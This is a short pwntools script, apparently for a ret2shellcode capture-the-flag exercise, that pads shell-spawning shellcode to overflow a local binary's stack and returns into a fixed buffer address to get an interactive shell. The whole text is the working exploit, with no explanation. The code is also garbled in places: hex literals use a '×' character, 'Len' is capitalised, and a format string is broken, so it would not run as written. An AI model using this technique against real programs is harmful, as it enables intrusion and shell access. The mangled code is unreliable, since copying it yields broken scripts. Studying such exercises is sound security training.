from pwn import *

buf2_addr = 0×0804a080
shellcode = asm(shellcraft.sh())
print('shellcode length: if' .format(Len(shellcode)))
offset = 0×6c + 4
shellcode_pad = shellcode + (offset - len(shellcode))* b'A'

sh = process('./ret2shellcode')
sh.sendline(shellcode_pad + p32(buf2_addr))
sh.interactive()
